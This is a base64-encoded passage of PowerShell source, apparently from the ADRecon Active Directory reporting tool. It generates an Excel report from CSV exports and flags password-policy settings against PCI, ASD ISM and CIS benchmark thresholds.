CAgICAgICAkU3RhcnRSb3cgPSAkbnVsbCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgICRTdGFydENvbHVtbiA9ICRudWxsCiAgICApCgogICAgJGV4Y2VsLlNjcmVlblVwZGF0aW5nID0gJGZhbHNlCiAgICAkZXhjZWwuRGlzcGxheUFsZXJ0cyA9ICRmYWxzZQogICAgJHdvcmtzaGVldCA9ICR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkKICAgICRjaGFydCA9ICR3b3Jrc2hlZXQuU2hhcGVzLkFkZENoYXJ0KCkuQ2hhcnQKICAgICMgaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvdmJhL2V4Y2VsLXZiYS9hcnRpY2xlcy94bGNoYXJ0dHlwZS1lbnVtZXJhdGlvbi1leGNlbAogICAgJGNoYXJ0LmNoYXJ0VHlwZSA9IFtpbnRdKFtNaWNyb3NvZnQuT2ZmaWNlLkludGVyb3AuRXhjZWwuWExDaGFydFR5cGVdOjokQ2hhcnRUeXBlKQogICAgJGNoYXJ0LkFwcGx5TGF5b3V0KCRDaGFydExheW91dCkKICAgIElmICgkbnVsbCAtZXEgJENoYXJ0RGF0YSkKICAgIHsKICAgICAgICBJZiAoJG51bGwgLWVxICRTdGFydFJvdykKICAgICAgICB7CiAgICAgICAgICAgICRzdGFydCA9ICR3b3Jrc2hlZXQuUmFuZ2UoIkExIikKICAgICAgICB9CiAgICAgICAgRWxzZQogICAgICAgIHsKICAgICAgICAgICAgJHN0YXJ0ID0gJHdvcmtzaGVldC5SYW5nZSgkU3RhcnRSb3cpCiAgICAgICAgfQogICAgICAgICMgZ2V0IHRoZSBsYXN0IGNlbGwKICAgICAgICAkWCA9ICR3b3Jrc2hlZXQuUmFuZ2UoJHN0YXJ0LCRzdGFydC5FbmQoW01pY3Jvc29mdC5PZmZpY2UuSW50ZXJvcC5FeGNlbC5YTERpcmVjdGlvbl06OnhsRG93bikpCiAgICAgICAgSWYgKCRudWxsIC1lcSAkU3RhcnRDb2x1bW4pCiAgICAgICAgewogICAgICAgICAgICAkc3RhcnQgPSAkd29ya3NoZWV0LlJhbmdlKCJCMSIpCiAgICAgICAgfQogICAgICAgIEVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRzdGFydCA9ICR3b3Jrc2hlZXQuUmFuZ2UoJFN0YXJ0Q29sdW1uKQogICAgICAgIH0KICAgICAgICAjIGdldCB0aGUgbGFzdCBjZWxsCiAgICAgICAgJFkgPSAkd29ya3NoZWV0LlJhbmdlKCRzdGFydCwkc3RhcnQuRW5kKFtNaWNyb3NvZnQuT2ZmaWNlLkludGVyb3AuRXhjZWwuWExEaXJlY3Rpb25dOjp4bERvd24pKQogICAgICAgICRDaGFydERhdGEgPSAkd29ya3NoZWV0LlJhbmdlKCRYLCRZKQoKICAgICAgICBHZXQtQURSRXhjZWxDb21PYmpSZWxlYXNlIC1Db21PYmp0b1JlbGVhc2UgJFgKICAgICAgICBSZW1vdmUtVmFyaWFibGUgWAogICAgICAgIEdldC1BRFJFeGNlbENvbU9ialJlbGVhc2UgLUNvbU9ianRvUmVsZWFzZSAkWQogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBZCiAgICAgICAgR2V0LUFEUkV4Y2VsQ29tT2JqUmVsZWFzZSAtQ29tT2JqdG9SZWxlYXNlICRzdGFydAogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBzdGFydAogICAgfQogICAgJGNoYXJ0LlNldFNvdXJjZURhdGEoJENoYXJ0RGF0YSkKICAgICMgaHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvZG90bmV0L2FwaS9taWNyb3NvZnQub2ZmaWNlLmludGVyb3AuZXhjZWwuY2hhcnRjbGFzcy5wbG90Ynk/cmVkaXJlY3RlZGZyb209TVNETiZ2aWV3PWV4Y2VsLXBpYSNNaWNyb3NvZnRfT2ZmaWNlX0ludGVyb3BfRXhjZWxfQ2hhcnRDbGFzc19QbG90QnkKICAgICRjaGFydC5QbG90QnkgPSBbTWljcm9zb2Z0Lk9mZmljZS5JbnRlcm9wLkV4Y2VsLlhsUm93Q29sXTo6eGxDb2x1bW5zCiAgICAkY2hhcnQuc2VyaWVzQ29sbGVjdGlvbigxKS5TZWxlY3QoKSB8IE91dC1OdWxsCiAgICAkY2hhcnQuU2VyaWVzQ29sbGVjdGlvbigxKS5BcHBseURhdGFMYWJlbHMoKSB8IG91dC1OdWxsCiAgICAjIG1vZGlmeSB0aGUgY2hhcnQgdGl0bGUKICAgICRjaGFydC5IYXNUaXRsZSA9ICRUcnVlCiAgICAkY2hhcnQuQ2hhcnRUaXRsZS5UZXh0ID0gJENoYXJ0VGl0bGUKICAgICMgUmVwb3NpdGlvbiB0aGUgQ2hhcnQKICAgICR0ZW1wID0gJHdvcmtzaGVldC5SYW5nZSgkUmFuZ2V0b0NvdmVyKQogICAgIyAkY2hhcnQucGFyZW50LnBsYWNlbWVudCA9IDMKICAgICRjaGFydC5wYXJlbnQudG9wID0gJHRlbXAuVG9wCiAgICAkY2hhcnQucGFyZW50LmxlZnQgPSAkdGVtcC5MZWZ0CiAgICAkY2hhcnQucGFyZW50LndpZHRoID0gJHRlbXAuV2lkdGgKICAgIElmICgkQ2hhcnRUaXRsZSAtbmUgIlByaXZpbGVnZWQgR3JvdXBzIGluIEFEIikKICAgIHsKICAgICAgICAkY2hhcnQucGFyZW50LmhlaWdodCA9ICR0ZW1wLkhlaWdodAogICAgfQogICAgIyAkY2hhcnQuTGVnZW5kLkRlbGV0ZSgpCiAgICAkZXhjZWwuU2NyZWVuVXBkYXRpbmcgPSAkdHJ1ZQogICAgJGV4Y2VsLkRpc3BsYXlBbGVydHMgPSAkdHJ1ZQoKICAgIEdldC1BRFJFeGNlbENvbU9ialJlbGVhc2UgLUNvbU9ianRvUmVsZWFzZSAkY2hhcnQKICAgIFJlbW92ZS1WYXJpYWJsZSBjaGFydAogICAgR2V0LUFEUkV4Y2VsQ29tT2JqUmVsZWFzZSAtQ29tT2JqdG9SZWxlYXNlICRDaGFydERhdGEKICAgIFJlbW92ZS1WYXJpYWJsZSBDaGFydERhdGEKICAgIEdldC1BRFJFeGNlbENvbU9ialJlbGVhc2UgLUNvbU9ianRvUmVsZWFzZSAkdGVtcAogICAgUmVtb3ZlLVZhcmlhYmxlIHRlbXAKICAgIEdldC1BRFJFeGNlbENvbU9ialJlbGVhc2UgLUNvbU9ianRvUmVsZWFzZSAkd29ya3NoZWV0CiAgICBSZW1vdmUtVmFyaWFibGUgd29ya3NoZWV0Cn0KCkZ1bmN0aW9uIEdldC1BRFJFeGNlbFNvcnQKewo8IwouU1lOT1BTSVMKICAgIFNvcnRzIGEgV29ya1NoZWV0IGluIHRoZSBhY3RpdmUgV29ya2Jvb2suCgouREVTQ1JJUFRJT04KICAgIFNvcnRzIGEgV29ya1NoZWV0IGluIHRoZSBhY3RpdmUgV29ya2Jvb2suCgouUEFSQU1FVEVSIENvbHVtbk5hbWUKICAgIFtzdHJpbmddCiAgICBOYW1lIG9mIHRoZSBDb2x1bW4uCiM+CiAgICBwYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJENvbHVtbk5hbWUKICAgICkKCiAgICAkd29ya3NoZWV0ID0gJHdvcmtib29rLldvcmtzaGVldHMuSXRlbSgxKQogICAgJHdvcmtzaGVldC5BY3RpdmF0ZSgpOwoKICAgICRFeGNlbENvbHVtbiA9ICgkd29ya3NoZWV0LkNvbHVtbnMuRmluZCgkQ29sdW1uTmFtZSkpCiAgICBJZiAoJEV4Y2VsQ29sdW1uKQogICAgewogICAgICAgIElmICgkRXhjZWxDb2x1bW4uVGV4dCAtbmUgJENvbHVtbk5hbWUpCiAgICAgICAgewogICAgICAgICAgICAkQmVnaW5BZGRyZXNzID0gJEV4Y2VsQ29sdW1uLkFkZHJlc3MoMCwwLDEsMSkKICAgICAgICAgICAgJEVuZCA9ICRGYWxzZQogICAgICAgICAgICBEbyB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LUFEUkV4Y2VsU29ydF0gJCgkRXhjZWxDb2x1bW4uVGV4dCkgc2VsZWN0ZWQgaW5zdGVhZCBvZiAkKCRDb2x1bW5OYW1lKSBpbiB0aGUgJCgkd29ya3NoZWV0Lk5hbWUpIHdvcmtzaGVldC4iCiAgICAgICAgICAgICAgICAkRXhjZWxDb2x1bW4gPSAoJHdvcmtzaGVldC5Db2x1bW5zLkZpbmROZXh0KCRFeGNlbENvbHVtbikpCiAgICAgICAgICAgICAgICAkQWRkcmVzcyA9ICRFeGNlbENvbHVtbi5BZGRyZXNzKDAsMCwxLDEpCiAgICAgICAgICAgICAgICBJZiAoICgkQWRkcmVzcyAtZXEgJEJlZ2luQWRkcmVzcykgLW9yICgkRXhjZWxDb2x1bW4uVGV4dCAtZXEgJENvbHVtbk5hbWUpICkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkRW5kID0gJFRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBVbnRpbCAoJEVuZCAtZXEgJFRydWUpCiAgICAgICAgfQogICAgICAgIElmICgkRXhjZWxDb2x1bW4uVGV4dCAtZXEgJENvbHVtbk5hbWUpCiAgICAgICAgewogICAgICAgICAgICAjIFNvcnQgYnkgQ29sdW1uCiAgICAgICAgICAgICR3b3JrU2hlZXQuTGlzdE9iamVjdHMuSXRlbSgxKS5Tb3J0LlNvcnRGaWVsZHMuQ2xlYXIoKQogICAgICAgICAgICAkd29ya1NoZWV0Lkxpc3RPYmplY3RzLkl0ZW0oMSkuU29ydC5Tb3J0RmllbGRzLkFkZCgkRXhjZWxDb2x1bW4pIHwgT3V0LU51bGwKICAgICAgICAgICAgJHdvcmtzaGVldC5MaXN0T2JqZWN0cy5JdGVtKDEpLlNvcnQuQXBwbHkoKQogICAgICAgIH0KICAgICAgICBFbHNlCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LUFEUkV4Y2VsU29ydF0gJCgkQ29sdW1uTmFtZSkgbm90IGZvdW5kIGluIHRoZSAkKCR3b3Jrc2hlZXQuTmFtZSkgd29ya3NoZWV0LiIKICAgICAgICB9CiAgICB9CiAgICBFbHNlCiAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1BRFJFeGNlbFNvcnRdICQoJENvbHVtbk5hbWUpIG5vdCBmb3VuZCBpbiB0aGUgJCgkd29ya3NoZWV0Lk5hbWUpIHdvcmtzaGVldC4iCiAgICB9CiAgICBHZXQtQURSRXhjZWxDb21PYmpSZWxlYXNlIC1Db21PYmp0b1JlbGVhc2UgJHdvcmtzaGVldAogICAgUmVtb3ZlLVZhcmlhYmxlIHdvcmtzaGVldAp9CgpGdW5jdGlvbiBFeHBvcnQtQURSRXhjZWwKewo8IwouU1lOT1BTSVMKICAgIEF1dG9tYXRlcyB0aGUgZ2VuZXJhdGlvbiBvZiB0aGUgQURSZWNvbiByZXBvcnQuCgouREVTQ1JJUFRJT04KICAgIEF1dG9tYXRlcyB0aGUgZ2VuZXJhdGlvbiBvZiB0aGUgQURSZWNvbiByZXBvcnQuIElmIHNwZWNpZmljIGZpbGVzIGV4aXN0LCB0aGV5IGFyZSBpbXBvcnRlZCBpbnRvIHRoZSBBRFJlY29uIHJlcG9ydC4KCi5QQVJBTUVURVIgRXhjZWxQYXRoCiAgICBbc3RyaW5nXQogICAgUGF0aCBmb3IgQURSZWNvbiBvdXRwdXQgZm9sZGVyIGNvbnRhaW5pbmcgdGhlIENTViBmaWxlcyB0byBnZW5lcmF0ZSB0aGUgQURSZWNvbi1SZXBvcnQueGxzeAoKLk9VVFBVVFMKICAgIENyZWF0ZXMgdGhlIEFEUmVjb24tUmVwb3J0Lnhsc3ggcmVwb3J0IGluIHRoZSBmb2xkZXIuCiM+CiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbc3RyaW5nXSAkRXhjZWxQYXRoCiAgICApCgogICAgJEV4Y2VsUGF0aCA9ICQoKENvbnZlcnQtUGF0aCAkRXhjZWxQYXRoKS5UcmltRW5kKCJcIikpCiAgICAkUmVwb3J0UGF0aCA9IC1qb2luKCRFeGNlbFBhdGgsJ1wnLCdDU1YtRmlsZXMnKQogICAgSWYgKCEoVGVzdC1QYXRoICRSZXBvcnRQYXRoKSkKICAgIHsKICAgICAgICBXcml0ZS1XYXJuaW5nICJbRXhwb3J0LUFEUkV4Y2VsXSBDb3VsZCBub3QgbG9jYXRlIHRoZSBDU1YtRmlsZXMgZGlyZWN0b3J5IC4uLiBFeGl0aW5nIgogICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgIFJldHVybiAkbnVsbAogICAgfQogICAgR2V0LUFEUkV4Y2VsQ29tT2JqCiAgICBJZiAoJGV4Y2VsKQogICAgewogICAgICAgIFdyaXRlLU91dHB1dCAiWypdIEdlbmVyYXRpbmcgQURSZWNvbi1SZXBvcnQueGxzeCIKCiAgICAgICAgJEFERmlsZU5hbWUgPSAtam9pbigkUmVwb3J0UGF0aCwnXCcsJ0Fib3V0QURSZWNvbi5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxJbXBvcnQgLUFERmlsZU5hbWUgJEFERmlsZU5hbWUKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERmlsZU5hbWUKCiAgICAgICAgICAgICR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkuTmFtZSA9ICJBYm91dCBBRFJlY29uIgogICAgICAgICAgICAkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpLkh5cGVybGlua3MuQWRkKCR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkuQ2VsbHMuSXRlbSgzLDIpICwgImh0dHBzOi8vZ2l0aHViLmNvbS9zZW5zZS1vZi1zZWN1cml0eS9BRFJlY29uIiwgIiIgLCAiIiwgImdpdGh1Yi5jb20vc2Vuc2Utb2Ytc2VjdXJpdHkvQURSZWNvbiIpIHwgT3V0LU51bGwKICAgICAgICAgICAgJHdvcmtib29rLldvcmtzaGVldHMuSXRlbSgxKS5Vc2VkUmFuZ2UuRW50aXJlQ29sdW1uLkF1dG9GaXQoKSB8IE91dC1OdWxsCiAgICAgICAgfQoKICAgICAgICAkQURGaWxlTmFtZSA9IC1qb2luKCRSZXBvcnRQYXRoLCdcJywnRm9yZXN0LmNzdicpCiAgICAgICAgSWYgKFRlc3QtUGF0aCAkQURGaWxlTmFtZSkKICAgICAgICB7CiAgICAgICAgICAgIEdldC1BRFJFeGNlbFdvcmtib29rIC1OYW1lICJGb3Jlc3QiCiAgICAgICAgICAgIEdldC1BRFJFeGNlbEltcG9ydCAtQURGaWxlTmFtZSAkQURGaWxlTmFtZQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGaWxlTmFtZQogICAgICAgIH0KCiAgICAgICAgJEFERmlsZU5hbWUgPSAtam9pbigkUmVwb3J0UGF0aCwnXCcsJ0RvbWFpbi5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiRG9tYWluIgogICAgICAgICAgICBHZXQtQURSRXhjZWxJbXBvcnQgLUFERmlsZU5hbWUgJEFERmlsZU5hbWUKICAgICAgICAgICAgJERvbWFpbk9iaiA9IEltcG9ydC1DU1YgLVBhdGggJEFERmlsZU5hbWUKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERmlsZU5hbWUKICAgICAgICAgICAgJERvbWFpbk5hbWUgPSAtam9pbigkRG9tYWluT2JqWzBdLlZhbHVlLCItIikKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIERvbWFpbk9iagogICAgICAgIH0KCiAgICAgICAgJEFERmlsZU5hbWUgPSAtam9pbigkUmVwb3J0UGF0aCwnXCcsJ1RydXN0cy5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiVHJ1c3RzIgogICAgICAgICAgICBHZXQtQURSRXhjZWxJbXBvcnQgLUFERmlsZU5hbWUgJEFERmlsZU5hbWUKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERmlsZU5hbWUKICAgICAgICB9CgogICAgICAgICRBREZpbGVOYW1lID0gLWpvaW4oJFJlcG9ydFBhdGgsJ1wnLCdTdWJuZXRzLmNzdicpCiAgICAgICAgSWYgKFRlc3QtUGF0aCAkQURGaWxlTmFtZSkKICAgICAgICB7CiAgICAgICAgICAgIEdldC1BRFJFeGNlbFdvcmtib29rIC1OYW1lICJTdWJuZXRzIgogICAgICAgICAgICBHZXQtQURSRXhjZWxJbXBvcnQgLUFERmlsZU5hbWUgJEFERmlsZU5hbWUKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERmlsZU5hbWUKICAgICAgICB9CgogICAgICAgICRBREZpbGVOYW1lID0gLWpvaW4oJFJlcG9ydFBhdGgsJ1wnLCdTaXRlcy5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiU2l0ZXMiCiAgICAgICAgICAgIEdldC1BRFJFeGNlbEltcG9ydCAtQURGaWxlTmFtZSAkQURGaWxlTmFtZQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGaWxlTmFtZQogICAgICAgIH0KCiAgICAgICAgJEFERmlsZU5hbWUgPSAtam9pbigkUmVwb3J0UGF0aCwnXCcsJ0ZpbmVHcmFpbmVkUGFzc3dvcmRQb2xpY3kuY3N2JykKICAgICAgICBJZiAoVGVzdC1QYXRoICRBREZpbGVOYW1lKQogICAgICAgIHsKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsV29ya2Jvb2sgLU5hbWUgIkZpbmUgR3JhaW5lZCBQYXNzd29yZCBQb2xpY3kiCiAgICAgICAgICAgIEdldC1BRFJFeGNlbEltcG9ydCAtQURGaWxlTmFtZSAkQURGaWxlTmFtZQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGaWxlTmFtZQogICAgICAgIH0KCiAgICAgICAgJEFERmlsZU5hbWUgPSAtam9pbigkUmVwb3J0UGF0aCwnXCcsJ0RlZmF1bHRQYXNzd29yZFBvbGljeS5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiRGVmYXVsdCBQYXNzd29yZCBQb2xpY3kiCiAgICAgICAgICAgIEdldC1BRFJFeGNlbEltcG9ydCAtQURGaWxlTmFtZSAkQURGaWxlTmFtZQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGaWxlTmFtZQoKICAgICAgICAgICAgJGV4Y2VsLlNjcmVlblVwZGF0aW5nID0gJGZhbHNlCiAgICAgICAgICAgICR3b3Jrc2hlZXQgPSAkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpCiAgICAgICAgICAgICMgaHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvb2ZmaWNlL3ZiYS9hcGkvZXhjZWwueGxoYWxpZ24KICAgICAgICAgICAgJHdvcmtzaGVldC5SYW5nZSgiQjI6RzEwIikuSG9yaXpvbnRhbEFsaWdubWVudCA9IC00MTA4CiAgICAgICAgICAgICMgaHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvb2ZmaWNlL3ZiYS9hcGkvZXhjZWwucmFuZ2UuYm9yZGVyYXJvdW5kCgogICAgICAgICAgICAiQTI6QjEwIiwgIkMyOkQxMCIsICJFMjpGMTAiLCAiRzI6RzEwIiB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICR3b3Jrc2hlZXQuUmFuZ2UoJF8pLkJvcmRlckFyb3VuZCgxKSB8IE91dC1OdWxsCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgaHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvZG90bmV0L2FwaS9taWNyb3NvZnQub2ZmaWNlLmludGVyb3AuZXhjZWwuZm9ybWF0Y29uZGl0aW9ucy5hZGQ/dmlldz1leGNlbC1waWEKICAgICAgICAgICAgIyAkd29ya3NoZWV0LlJhbmdlKCkuRm9ybWF0Q29uZGl0aW9ucy5BZGQKICAgICAgICAgICAgIyBodHRwOi8vZG1jcml0Y2hpZS5tdnBzLm9yZy9leGNlbC9jb2xvcnMuaHRtCiAgICAgICAgICAgICMgVmFsdWVzIGZvciBGb250LkNvbG9ySW5kZXgKCiAgICAgICAgICAgICRPYmpWYWx1ZXMgPSBAKAogICAgICAgICAgICAjIFBDSSBFbmZvcmNlIHBhc3N3b3JkIGhpc3RvcnkgKHBhc3N3b3JkcykKICAgICAgICAgICAgIkMyIiwgJz1JRihCMjw0LFRSVUUsIEZBTFNFKScKCiAgICAgICAgICAgICMgUENJIE1heGltdW0gcGFzc3dvcmQgYWdlIChkYXlzKQogICAgICAgICAgICAiQzMiLCAnPUlGKE9SKEIzPTAsQjM+OTApLFRSVUUsIEZBTFNFKScKCiAgICAgICAgICAgICMgUENJIE1pbmltdW0gcGFzc3dvcmQgYWdlIChkYXlzKQoKICAgICAgICAgICAgIyBQQ0kgTWluaW11bSBwYXNzd29yZCBsZW5ndGggKGNoYXJhY3RlcnMpCiAgICAgICAgICAgICJDNSIsICc9SUYoQjU8NyxUUlVFLCBGQUxTRSknCgogICAgICAgICAgICAjIFBDSSBQYXNzd29yZCBtdXN0IG1lZXQgY29tcGxleGl0eSByZXF1aXJlbWVudHMKICAgICAgICAgICAgIkM2IiwgJz1JRihCNjw+VFJVRSxUUlVFLCBGQUxTRSknCgogICAgICAgICAgICAjIFBDSSBTdG9yZSBwYXNzd29yZCB1c2luZyByZXZlcnNpYmxlIGVuY3J5cHRpb24gZm9yIGFsbCB1c2VycyBpbiB0aGUgZG9tYWluCgogICAgICAgICAgICAjIFBDSSBBY2NvdW50IGxvY2tvdXQgZHVyYXRpb24gKG1pbnMpCiAgICAgICAgICAgICJDOCIsICc9SUYoQU5EKEI4Pj0xLEI4PDMwKSxUUlVFLCBGQUxTRSknCgogICAgICAgICAgICAjIFBDSSBBY2NvdW50IGxvY2tvdXQgdGhyZXNob2xkIChhdHRlbXB0cykKICAgICAgICAgICAgIkM5IiwgJz1JRihPUihCOT0wLEI5PjYpLFRSVUUsIEZBTFNFKScKCiAgICAgICAgICAgICMgUENJIFJlc2V0IGFjY291bnQgbG9ja291dCBjb3VudGVyIGFmdGVyIChtaW5zKQoKICAgICAgICAgICAgIyBBU0QgSVNNIEVuZm9yY2UgcGFzc3dvcmQgaGlzdG9yeSAocGFzc3dvcmRzKQogICAgICAgICAgICAiRTIiLCAnPUlGKEIyPDgsVFJVRSwgRkFMU0UpJwoKICAgICAgICAgICAgIyBBU0QgSVNNIE1heGltdW0gcGFzc3dvcmQgYWdlIChkYXlzKQogICAgICAgICAgICAiRTMiLCAnPUlGKE9SKEIzPTAsQjM+OTApLFRSVUUsIEZBTFNFKScKCiAgICAgICAgICAgICMgQVNEIElTTSBNaW5pbXVtIHBhc3N3b3JkIGFnZSAoZGF5cykKICAgICAgICAgICAgIkU0IiwgJz1JRihCND0wLFRSVUUsIEZBTFNFKScKCiAgICAgICAgICAgICMgQVNEIElTTSBNaW5pbXVtIHBhc3N3b3JkIGxlbmd0aCAoY2hhcmFjdGVycykKICAgICAgICAgICAgIkU1IiwgJz1JRihCNTwxMyxUUlVFLCBGQUxTRSknCgogICAgICAgICAgICAjIEFTRCBJU00gUGFzc3dvcmQgbXVzdCBtZWV0IGNvbXBsZXhpdHkgcmVxdWlyZW1lbnRzCiAgICAgICAgICAgICJFNiIsICc9SUYoQjY8PlRSVUUsVFJVRSwgRkFMU0UpJwoKICAgICAgICAgICAgIyBBU0QgSVNNIFN0b3JlIHBhc3N3b3JkIHVzaW5nIHJldmVyc2libGUgZW5jcnlwdGlvbiBmb3IgYWxsIHVzZXJzIGluIHRoZSBkb21haW4KCiAgICAgICAgICAgICMgQVNEIElTTSBBY2NvdW50IGxvY2tvdXQgZHVyYXRpb24gKG1pbnMpCgogICAgICAgICAgICAjIEFTRCBJU00gQWNjb3VudCBsb2Nrb3V0IHRocmVzaG9sZCAoYXR0ZW1wdHMpCiAgICAgICAgICAgICJFOSIsICc9SUYoT1IoQjk9MCxCOT41KSxUUlVFLCBGQUxTRSknCgogICAgICAgICAgICAjIEFTRCBJU00gUmVzZXQgYWNjb3VudCBsb2Nrb3V0IGNvdW50ZXIgYWZ0ZXIgKG1pbnMpCgogICAgICAgICAgICAjIENJUyBCZW5jaG1hcmsgRW5mb3JjZSBwYXNzd29yZCBoaXN0b3J5IChwYXNzd29yZHMpCiAgICAgICAgICAgICJHMiIsICc9SUYoQjI8MjQsVFJVRSwgRkFMU0UpJwoKICAgICAgICAgICAgIyBDSVMgQmVuY2htYXJrIE1heGltdW0gcGFzc3dvcmQgYWdlIChkYXlzKQogICAgICAgICAgICAiRzMiLCAnPUlGKE9SKEIzPTAsQjM+NjApLFRSVUUsIEZBTFNFKScKCiAgICAgICAgICAgICMgQ0lTIEJlbmNobWFyayBNaW5pbXVtIHBhc3N3b3JkIGFnZSAoZGF5cykKICAgICAgICAgICAgIkc0IiwgJz1JRihCND0wLFRSVUUsIEZBTFNFKScKCiAgICAgICAgICAgICMgQ0lTIEJlbmNobWFyayBNaW5pbXVtIHBhc3N3b3JkIGxlbmd0aCAoY2hhcmFjdGVycykKICAgICAgICAgICAgIkc1IiwgJz1JRihCNTwxNCxUUlVFLCBGQUxTRSknCgogICAgICAgICAgICAjIENJUyBCZW5jaG1hcmsgUGFzc3dvcmQgbXVzdCBtZWV0IGNvbXBsZXhpdHkgcmVxdWlyZW1lbnRzCiAgICAgICAgICAgICJHNiIsICc9SUYoQjY8PlRSVUUsVFJVRSwgRkFMU0UpJwoKICAgICAgICAgICAgIyBDSVMgQmVuY2htYXJrIFN0b3JlIHBhc3N3b3JkIHVzaW5nIHJldmVyc2libGUgZW5jcnlwdGlvbiBmb3IgYWxsIHVzZXJzIGluIHRoZSBkb21haW4KICAgICAgICAgICAgIkc3IiwgJz1JRihCNzw+RkFMU0UsVFJVRSwgRkFMU0UpJwoKICAgICAgICAgICAgIyBDSVMgQmVuY2htYXJrIEFjY291bnQgbG9ja291dCBkdXJhdGlvbiAobWlucykKICAgICAgICAgICAgIkc4IiwgJz1JRihBTkQoQjg+PTEsQjg8MTUpLFRSVUUsIEZBTFNFKScKCiAgICAgICAgICAgICMgQ0lTIEJlbmNobWFyayBBY2NvdW50IGxvY2tvdXQgdGhyZXNob2xkIChhdHRlbXB0cykKICAgICAgICAgICAgIkc5IiwgJz1JRihPUihCOT0wLEI5PjEwKSxUUlVFLCBGQUxTRSknCgogICAgICAgICAgICAjIENJUyBCZW5jaG1hcmsgUmVzZXQgYWNjb3VudCBsb2Nrb3V0IGNvdW50ZXIgYWZ0ZXIgKG1pbnMpCiAgICAgICAgICAgICJHMTAiLCAnPUlGKEIxMDwxNSxUUlVFLCBGQUxTRSknICkKCiAgICAgICAgICAgIEZvciAoJGkgPSAwOyAkaSAtbHQgJCgkT2JqVmFsdWVzLkNvdW50KTsgJGkrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHdvcmtzaGVldC5SYW5nZSgkT2JqVmFsdWVzWyRpXSkuRm9ybWF0Q29uZGl0aW9ucy5BZGQoW01pY3Jvc29mdC5PZmZpY2UuSW50ZXJvcC5FeGNlbC5YbEZvcm1hdENvbmRpdGlvblR5cGVdOjp4bEV4cHJlc3Npb24sIDAsICRPYmpWYWx1ZXNbJGkrMV0pIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgICRpKysKICAgICAgICAgICAgfQoKICAgICAgICAgICAgIkMyIiwgIkMzIiAsICJDNSIsICJDNiIsICJDOCIsICJDOSIsICJFMiIsICJFMyIgLCAiRTQiLCAiRTUiLCAiRTYiLCAiRTkiLCAiRzIiLCAiRzMiLCAiRzQiLCAiRzUiLCAiRzYiLCAiRzciLCAiRzgiLCAiRzkiLCAiRzEwIiB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICR3b3Jrc2hlZXQuUmFuZ2UoJF8pLkZvcm1hdENvbmRpdGlvbnMuSXRlbSgxKS5TdG9wSWZUcnVlID0gJGZhbHNlCiAgICAgICAgICAgICAgICAkd29ya3NoZWV0LlJhbmdlKCRfKS5Gb3JtYXRDb25kaXRpb25zLkl0ZW0oMSkuRm9udC5Db2xvckluZGV4ID0gMwogICAgICAgICAgICB9CgogICAgICAgICAgICAkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpLkh5cGVybGlua3MuQWRkKCR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkuQ2VsbHMuSXRlbSgxLDQpICwgImh0dHBzOi8vd3d3LnBjaXNlY3V